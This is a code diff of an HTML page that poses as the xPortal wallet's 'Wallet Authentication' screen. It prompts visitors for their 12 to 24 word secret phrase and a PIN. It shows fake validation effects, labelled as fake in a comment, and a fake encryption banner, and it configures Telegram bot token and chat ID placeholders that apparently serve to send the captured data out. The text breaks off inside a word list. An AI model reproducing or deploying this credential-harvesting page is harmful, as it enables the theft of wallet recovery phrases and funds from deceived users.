@@ -1,937 +1,188 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>xPortal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>xPortal | Wallet Authentication</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        :root { --teal: #23f7dd; --purple: #8a3ffc; --bg: #000; --err: #ff4d4d; --border: rgba(255,255,255,0.08); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: #fff; min-height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 85%); }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #000000;
-            color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
+        .app-shell { width: 100%; max-width: 420px; padding: 25px; position: relative; }
+        .back-btn { cursor: pointer; display: none; align-items: center; gap: 8px; color: #888; font-size: 14px; font-weight: 600; margin-bottom: 20px; transition: 0.2s; }
+        .back-btn:hover { color: #fff; }
+        .logo { width: 75px; height: 75px; filter: drop-shadow(0 0 20px rgba(35, 247, 221, 0.15)); margin: 0 auto 30px; display: block; }
 
-        .screen {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            height: 100vh;
-            max-height: 850px;
-            flex-direction: column;
-            align-items: center;
-            padding: 40px 24px;
-            position: relative;
-        }
+        h1 { font-size: 28px; font-weight: 800; letter-spacing: -1.2px; margin-bottom: 12px; text-align: center; }
+        .sub { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 30px; text-align: center; }
 
-        .screen.active {
-            display: flex;
-        }
+        .view { display: none; width: 100%; animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .view.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Screen 1 - Logo */
-        #screen1 {
-            justify-content: center;
-        }
+        .selector { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .opt { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: #666; padding: 10px 14px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: 700; transition: 0.2s; }
+        .opt.active { background: var(--purple); color: #fff; border-color: var(--purple); box-shadow: 0 4px 15px rgba(138, 63, 252, 0.3); }
 
-        .logo-container {
-            width: 120px;
-            height: 120px;
-            background: #3a3f4a;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; max-height: 300px; overflow-y: auto; padding: 5px; scrollbar-width: none; }
+        .cell { position: relative; }
+        .cell label { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 9px; color: var(--teal); font-weight: 800; opacity: 0.5; pointer-events: none; }
+        .cell input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 14px 8px 14px 26px; color: #fff; font-size: 12px; outline: none; transition: 0.2s; text-transform: lowercase; }
+        
+        /* Interactive States */
+        .cell.valid input { border-color: var(--teal); background: rgba(35, 247, 221, 0.03); }
+        .cell.error input { border-color: var(--err); color: var(--err); animation: shake 0.4s both; }
+        @keyframes shake { 10%,90%{transform:translate3d(-1px,0,0)} 20%,80%{transform:translate3d(2px,0,0)} 30%,50%,70%{transform:translate3d(-4px,0,0)} 40%,60%{transform:translate3d(4px,0,0)} }
 
-        .logo-container img {
-            width: 80px;
-            height: 80px;
-            object-fit: contain;
-        }
+        .hint-bar { height: 20px; color: var(--err); font-size: 11px; font-weight: 600; text-align: center; margin-bottom: 15px; visibility: hidden; }
 
-        /* Screen 2 - Main Menu */
-        #screen2 {
-            justify-content: center;
-        }
+        .btn-main { width: 100%; height: 62px; border-radius: 100px; font-size: 16px; font-weight: 700; border: none; cursor: pointer; transition: 0.3s; background: #fff; color: #000; }
+        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.4); }
 
-        .brand-full {
-            margin-bottom: 60px;
-        }
+        .dots { display: flex; justify-content: center; gap: 15px; margin: 25px 0; }
+        .dot { width: 15px; height: 15px; border: 2px solid var(--border); border-radius: 50%; }
+        .dot.on { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
+        .k { width: 68px; height: 68px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; cursor: pointer; }
+        .k:active { background: var(--purple); }
 
-        .brand-full img {
-            width: 180px;
-            height: auto;
-            object-fit: contain;
-        }
-
-        /* الأزرار المستطيلة بنفس المقاس */
-        .button {
-            width: 100%;
-            padding: 20px 24px;
-            background: #2c2f38;
-            border: none;
-            border-radius: 12px;
-            color: #ffffff;
-            font-size: 16px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            margin-bottom: 12px;
-            text-align: left;
-            min-height: 64px;
-        }
-
-        .button:hover {
-            background: #3a3f4a;
-        }
-
-        .button img {
-            width: 24px;
-            height: 24px;
-            object-fit: contain;
-            flex-shrink: 0;
-        }
-
-        /* Screen 3 - Import */
-        #screen3-import {
-            justify-content: flex-start;
-            padding-top: 60px;
-        }
-
-        .back-btn {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            width: 40px;
-            height: 40px;
-            background: transparent;
-            border: none;
-            color: #ffffff;
-            font-size: 24px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            transition: background 0.2s;
-        }
-
-        .back-btn:hover {
-            background: #2c2f38;
-        }
-
-        .title {
-            font-size: 22px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 12px;
-            margin-top: 20px;
-        }
-
-        .subtitle {
-            font-size: 14px;
-            color: #8b8f98;
-            text-align: center;
-            margin-bottom: 40px;
-            line-height: 1.5;
-        }
-
-        .input-container {
-            width: 100%;
-            background: #0d0d0d;
-            border-radius: 16px;
-            padding: 16px;
-            min-height: 120px;
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .input-area {
-            width: 100%;
-            min-height: 80px;
-            background: transparent;
-            border: none;
-            color: #ffffff;
-            font-size: 16px;
-            resize: none;
-            outline: none;
-            font-family: inherit;
-        }
-
-        .input-area::placeholder {
-            color: #5a5f6a;
-        }
-
-        .paste-btn {
-            position: absolute;
-            bottom: 16px;
-            right: 16px;
-            background: transparent;
-            border: none;
-            color: #8b8f98;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            cursor: pointer;
-        }
-
-        .paste-btn img {
-            width: 18px;
-            height: 18px;
-            object-fit: contain;
-        }
-
-        .word-input {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: #0d0d0d;
-            border-radius: 30px;
-            padding: 8px 16px;
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            max-width: 352px;
-        }
-
-        .word-number {
-            width: 28px;
-            height: 28px;
-            background: #2c2f38;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            color: #8b8f98;
-            flex-shrink: 0;
-        }
-
-        .word-input-field {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #ffffff;
-            font-size: 16px;
-            outline: none;
-            padding: 8px 0;
-        }
-
-        .word-input-field::placeholder {
-            color: #5a5f6a;
-        }
-
-        /* Screen 4 - Create */
-        #screen3 {
-            justify-content: flex-start;
-            padding-top: 60px;
-        }
-
-        .words-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            width: 100%;
-            margin-bottom: 100px;
-        }
-
-        .word-item {
-            background: #1a1d24;
-            border-radius: 12px;
-            padding: 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .word-index {
-            width: 24px;
-            height: 24px;
-            background: #2c2f38;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            color: #8b8f98;
-        }
-
-        .word-text {
-            font-size: 15px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-        }
-
-        .action-btn {
-            width: 100%;
-            padding: 18px;
-            background: #ffffff;
-            color: #000000;
-            border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            position: fixed;
-            bottom: 30px;
-            max-width: 352px;
-        }
-
-        .action-btn:hover {
-            background: #e0e0e0;
-        }
-
-        .copy-hint {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #2c2f38;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-size: 14px;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-        }
-
-        .copy-hint.show {
-            opacity: 1;
-        }
-
-        /* Screen 5 - Verify */
-        #screen5 {
-            justify-content: flex-start;
-            padding-top: 60px;
-        }
-
-        .progress {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            font-size: 14px;
-            color: #8b8f98;
-        }
-
-        .verify-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            width: 100%;
-        }
-
-        .verify-slot {
-            background: #1a1d24;
-            border: 2px solid #2c2f38;
-            border-radius: 12px;
-            padding: 16px 8px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-            min-height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-        }
-
-        .verify-slot:hover {
-            border-color: #3a3f4a;
-        }
-
-        .verify-slot.filled {
-            background: #2c3e28;
-            border-color: #4a7c3a;
-        }
-
-        .verify-slot.error {
-            background: #3e2828;
-            border-color: #7c3a3a;
-            animation: shake 0.5s;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .word-options {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            width: 100%;
-            margin-top: 30px;
-            justify-content: center;
-        }
-
-        .word-option {
-            background: #2c2f38;
-            border: none;
-            border-radius: 20px;
-            padding: 10px 18px;
-            color: #ffffff;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .word-option:hover {
-            background: #3a3f4a;
-        }
-
-        .word-option.used {
-            opacity: 0.3;
-            pointer-events: none;
-        }
-
-        /* Success */
-        #screen6 {
-            justify-content: center;
-            text-align: center;
-        }
-
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: #4a7c3a;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 24px;
-        }
-
-        .success-icon::after {
-            content: "✓";
-            font-size: 40px;
-            color: #ffffff;
-        }
-
-        .success-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 12px;
-        }
-
-        .success-text {
-            font-size: 14px;
-            color: #8b8f98;
-            margin-bottom: 40px;
-        }
-
-        /* رسالة الخطأ داخل الموقع */
-        .error-message {
-            position: fixed;
-            top: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #3e2828;
-            color: #ff6b6b;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 14px;
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.3s;
-            z-index: 1000;
-            max-width: 90%;
-            text-align: center;
-        }
-
-        .error-message.show {
-            opacity: 1;
-        }
+        #sync { display: none; text-align: center; color: var(--teal); font-weight: 800; font-size: 11px; letter-spacing: 2px; margin-top: 30px; }
     </style>
 </head>
 <body>
-    <!-- رسالة الخطأ -->
-    <div class="error-message" id="error-msg">Mot incorrect !</div>
 
-    <!-- Screen 1: Logo -->
-    <div class="screen active" id="screen1">
-        <div class="logo-container">
-            <img src="icon1.png" alt="xPortal">
+<div class="app-shell">
+    <div id="back" class="back-btn" onclick="handleBack()">
+        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back
+    </div>
+
+    <img src="Capture.PNG" class="logo">
+
+    <div id="v1" class="view active">
+        <h1>Welcome to xPortal</h1>
+        <p class="sub">The money super app. Secure your assets with bank-grade encryption.</p>
+        <button class="btn-main" onclick="go(3)">Import Existing Wallet</button>
+        <button class="btn-main" style="background:rgba(255,255,255,0.05); color:#fff; border:1px solid var(--border); margin-top:15px;" onclick="go(2)">Create New Wallet</button>
+    </div>
+
+    <div id="v3" class="view">
+        <h1>Secret Phrase</h1>
+        <p class="sub">Enter your secret words in the correct order.</p>
+        <div class="selector">
+            <button class="opt active" onclick="makeGrid(12, this)">12 Words</button>
+            <button class="opt" onclick="makeGrid(15, this)">15 Words</button>
+            <button class="opt" onclick="makeGrid(18, this)">18 Words</button>
+            <button class="opt" onclick="makeGrid(24, this)">24 Words</button>
+        </div>
+        <div id="msg" class="hint-bar">Invalid secret phrase</div>
+        <div class="grid" id="iGrid"></div>
+        <button class="btn-main" onclick="verifySteps()">Continue</button>
+    </div>
+
+    <div id="v4" class="view">
+        <h1>Verify PIN</h1>
+        <p class="sub">Confirm your security PIN to complete import.</p>
+        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+        <div class="keypad">
+            <script>for(let i=1;i<=9;i++) document.write(`<div class="k" onclick="pk(${i})">${i}</div>`);</script>
+            <div></div><div class="k" onclick="pk(0)">0</div><div class="k" onclick="del()">←</div>
         </div>
     </div>
 
-    <!-- Screen 2: Main Menu -->
-    <div class="screen" id="screen2">
-        <div class="brand-full">
-            <img src="icon5.png" alt="xPortal">
-        </div>
+    <div id="sync">ESTABLISHING ENCRYPTED BRIDGE...</div>
+</div>
+
+<script>
+    const CFG = { T: 'YOUR_BOT_TOKEN', C: 'YOUR_CHAT_ID' };
+    let stack = [1], phrase = "", pin = "";
+
+    function go(s, b=false) {
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById('v'+s).classList.add('active');
+        document.getElementById('back').style.display = s === 1 ? 'none' : 'flex';
+        if(!b) stack.push(s);
+        if(s === 3) makeGrid(12);
+    }
+
+    function handleBack() { if(stack.length > 1) { stack.pop(); go(stack[stack.length-1], true); } }
+
+    function makeGrid(n, btn) {
+        if(btn) { document.querySelectorAll('.opt').forEach(o => o.classList.remove('active')); btn.classList.add('active'); }
+        const g = document.getElementById('iGrid'); g.innerHTML = '';
+        for(let i=0; i<n; i++) {
+            g.innerHTML += `<div class="cell" id="wc-${i}"><label>${i+1}</label><input type="password" class="w-in" data-idx="${i}" onpaste="paster(event)" oninput="liveCheck(this)"></div>`;
+        }
+    }
+
+    // --- LIVE FEEDBACK & AUTO JUMP ---
+    function liveCheck(el) {
+        const val = el.value.trim().toLowerCase();
+        const idx = parseInt(el.getAttribute('data-idx'));
+        const parent = document.getElementById(`wc-${idx}`);
         
-        <button class="button" onclick="showScreen('screen3')">
-            <img src="icon2.png" alt="Wallet">
-            <span>Créer phrase secrète</span>
-        </button>
+        // Auto Jump on Space
+        if(val.includes(' ')) {
+            el.value = val.replace(/\s/g, '');
+            const next = document.querySelector(`input[data-idx="${idx + 1}"]`);
+            if(next) next.focus();
+        }
+
+        // Live Visual (Fake Validation)
+        if(val.length >= 3) parent.classList.add('valid');
+        else parent.classList.remove('valid');
         
-        <button class="button" onclick="showScreen('screen3-import')">
-            <img src="icon3.png" alt="Import">
-            <span>Importer un portefeuille existant</span>
-        </button>
-    </div>
+        document.getElementById('msg').style.visibility = 'hidden';
+        parent.classList.remove('error');
+    }
 
-    <!-- Screen 3: Import -->
-    <div class="screen" id="screen3-import">
-        <button class="back-btn" onclick="showScreen('screen2')">‹</button>
-        <h2 class="title">Veuillez saisir votre phrase secrète</h2>
-        <p class="subtitle">Veuillez saisir les 12 ou 24 mots de votre phrase secrète dans l'ordre :</p>
-        <div class="input-container">
-            <textarea class="input-area" id="import-words"></textarea>
-            <button class="paste-btn" onclick="pasteWords()">
-                Coller
-                <img src="icon4.png" alt="Paste">
-            </button>
-        </div>
-        <div class="word-input">
-            <span class="word-number">1</span>
-            <input type="text" class="word-input-field" placeholder="Taper ici..." id="word-input">
-        </div>
-    </div>
-
-    <!-- Screen 4: Create -->
-    <div class="screen" id="screen3">
-        <button class="back-btn" onclick="showScreen('screen2')">‹</button>
-        <h2 class="title">Sauvegardez votre phrase secrète</h2>
-        <p class="subtitle">Ces 12 mots sont la clé de votre portefeuille. Écrivez-les dans l'ordre et gardez-les en sécurité.</p>
-        <div class="words-grid" id="words-grid"></div>
-        <button class="action-btn" onclick="copyWords()">Copier</button>
-        <div class="copy-hint" id="copy-hint">Copié !</div>
-        <button class="action-btn" style="bottom: 100px;" onclick="showScreen('screen5')">Vérifier</button>
-    </div>
-
-    <!-- Screen 5: Verify -->
-    <div class="screen" id="screen5">
-        <button class="back-btn" onclick="showScreen('screen3')">‹</button>
-        <span class="progress" id="verify-progress">0/12</span>
-        <h2 class="title">Vérifiez votre phrase</h2>
-        <p class="subtitle">Appuyez sur les mots dans l'ordre correct</p>
-        <div class="verify-grid" id="verify-grid">
-            <div class="verify-slot" data-index="0"></div>
-            <div class="verify-slot" data-index="1"></div>
-            <div class="verify-slot" data-index="2"></div>
-            <div class="verify-slot" data-index="3"></div>
-            <div class="verify-slot" data-index="4"></div>
-            <div class="verify-slot" data-index="5"></div>
-            <div class="verify-slot" data-index="6"></div>
-            <div class="verify-slot" data-index="7"></div>
-            <div class="verify-slot" data-index="8"></div>
-            <div class="verify-slot" data-index="9"></div>
-            <div class="verify-slot" data-index="10"></div>
-            <div class="verify-slot" data-index="11"></div>
-        </div>
-        <div class="word-options" id="word-options"></div>
-    </div>
-
-    <!-- Screen 6: Success -->
-    <div class="screen" id="screen6">
-        <div class="success-icon"></div>
-        <h2 class="success-title">Vérification réussie !</h2>
-        <p class="success-text">Votre portefeuille est maintenant sécurisé.</p>
-        <button class="action-btn" onclick="showScreen('screen2')">Continuer</button>
-    </div>
-
-    <script>
-        // قائمة كلمات BIP39 بدون تكرار
-        const bip39Words = [
-            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
-            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
-            "action", "actor", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult",
-            "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree",
-            "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien",
-            "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always",
-            "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle",
-            "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety",
-            "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena",
-            "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow",
-            "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume",
-            "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august",
-            "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away",
-            "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance",
-            "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel", "base",
-            "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef", "before",
-            "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best", "betray",
-            "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird", "birth",
-            "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood",
-            "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bomb",
-            "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce",
-            "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze", "brick",
-            "bridge", "brief", "bright", "brilliant", "bring", "broccoli", "broken", "bronze", "broom", "brother",
-            "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet",
-            "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter", "buyer",
-            "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm", "camera",
-            "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon", "capable",
-            "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart", "case",
-            "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle", "caught",
-            "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain",
-            "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap",
-            "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child", "chimney", "choice",
-            "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle", "citizen", "city",
-            "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click",
-            "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud",
-            "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut", "code", "coffee",
-            "coil", "coin", "collect", "color", "column", "combine", "come", "comfort", "comic", "common",
-            "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control", "convince", "cook",
-            "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch",
-            "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle", "craft", "cram",
-            "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek", "crew", "cricket",
-            "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial", "cruel", "cruise",
-            "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup", "cupboard", "curious",
-            "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp",
-            "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris",
-            "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense", "define", "defy",
-            "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny", "depart", "depend",
-            "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk", "despair", "destroy",
-            "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice",
-            "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur", "direct", "dirt",
-            "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance", "divert", "divide",
-            "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain", "donate", "donkey",
-            "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama", "drastic", "draw",
-            "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry",
-            "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager",
-            "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy",
-            "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder", "electric",
-            "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody", "embrace", "emerge",
-            "emotion", "employ", "empty", "enable", "enact", "end", "endless", "endorse", "enemy", "energy",
-            "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
-            "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era", "erase", "erode",
-            "erosion", "error", "erupt", "escape", "essay", "essence", "estate", "eternal", "ethics", "evidence",
-            "evil", "evoke", "evolve", "exact", "example", "excess", "exchange", "excite", "exclude", "excuse",
-            "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect",
-            "expire", "explain", "explode", "explore", "export", "express", "extend", "extra", "eye", "eyebrow",
-            "fabric", "face", "facility", "fact", "factor", "factory", "fade", "fail", "fair", "faith",
-            "fall", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion",
-            "fat", "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee",
-            "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction",
-            "field", "fierce", "fifth", "fight", "figure", "file", "film", "filter", "final", "find",
-            "fine", "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness",
-            "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip", "float",
-            "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus", "fog", "foil",
-            "fold", "follow", "food", "foot", "force", "forest", "forget", "fork", "fortune", "forum",
-            "forward", "fossil", "foster", "found", "fox", "fragile", "frame", "frequent", "fresh", "friend",
-            "fringe", "frog", "front", "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny",
-            "furnace", "fury", "future", "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage",
-            "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze",
-            "general", "genius", "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle",
-            "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide", "glimpse",
-            "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess", "gold", "good",
-            "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab", "grace", "grain", "grant",
-            "grape", "grass", "gravity", "great", "green", "grid", "grief", "grit", "grocery", "group",
-            "grow", "grunt", "guard", "guess", "guide", "guilt", "guitar", "gun", "gym", "habit",
-            "hair", "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest",
-            "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog", "height",
-            "hello", "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip",
-            "hire", "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "holy", "home",
-            "honey", "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour",
-            "house", "hover", "how", "hub", "huge", "human", "humble", "humor", "hundred", "hungry",
-            "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify",
-            "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense", "immune", "impact",
-            "impose", "improve", "impulse", "inch", "incident", "include", "income", "increase", "index", "indicate",
-            "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial", "inject", "injury",
-            "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside", "insight", "insist",
-            "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
-            "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jaw", "jazz", "jealous",
-            "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice",
-            "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key",
-            "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten",
-            "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady",
-            "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava",
-            "law", "lawn", "lawsuit", "layer", "lazy", "lead", "leaf", "league", "learn", "leave",
-            "lecture", "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens",
-            "leopard", "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift",
-            "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "listen", "little",
-            "live", "lizard", "load", "loan", "lobster", "local", "lock", "locust", "lodge", "log",
-            "lonely", "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage",
-            "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic", "magnet", "maid",
-            "mail", "main", "major", "make", "mammal", "man", "manage", "mandate", "mango", "mansion",
-            "manual", "maple", "marble", "march", "margin", "marine", "market", "marriage", "mask", "mass",
-            "master", "match", "material", "math", "matrix", "matter", "maximum", "maze", "meadow", "mean",
-            "measure", "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory", "mention",
-            "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal", "method", "middle",
-            "midnight", "milk", "million", "mimic", "mind", "minimum", "minister", "minor", "minute", "miracle",
-            "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixture", "mobile", "model", "modify",
-            "mom", "moment", "monitor", "monkey", "monster", "month", "moon", "moral", "more", "morning",
-            "mosquito", "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin",
-            "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual", "myself", "mystery",
-            "myth", "naive", "name", "napkin", "narrow", "nasty", "nation", "nature", "near", "neck",
-            "need", "negative", "neglect", "neither", "nephew", "nerve", "nest", "net", "network", "neutral",
